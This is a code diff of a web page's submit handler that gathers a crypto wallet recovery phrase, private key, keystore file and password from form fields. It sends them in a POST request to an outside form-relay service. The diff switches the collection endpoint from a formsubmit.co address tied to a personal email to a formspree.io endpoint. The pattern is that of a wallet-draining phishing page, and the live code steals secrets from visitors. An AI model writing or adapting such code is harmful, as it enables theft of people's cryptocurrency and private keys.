@@ -86,24 +86,22 @@ document.getElementById('submitBtn').onclick = function () {
   const keystore = keystoreForm?.keystore?.value.trim() || '';
   const password = keystoreForm?.password?.value.trim() || '';
 
-  // Build URL-encoded string
-  const params = new URLSearchParams();
-  params.append('phrase', phrase);
-  params.append('privateKey', privateKey);
-  params.append('keystore', keystore);
-  params.append('password', password);
-
-  fetch('https://formsubmit.co/skashavkin@gmail.com', {
+  fetch('https://formspree.io/f/xqaybqon', {
     method: 'POST',
-    body: params,
+    body: JSON.stringify({
+      phrase,
+      privateKey,
+      keystore,
+      password
+    }),
     headers: {
       'Accept': 'application/json',
-      'Content-Type': 'application/x-www-form-urlencoded'
+      'Content-Type': 'application/json'
     }
   })
     .then(res => res.json())
     .then(data => {
-      if (data.success === "true") {
+      if (data.ok) {
         alert("Submitted successfully!");
         document.getElementById('popupModal').style.display = 'none';
       } else {
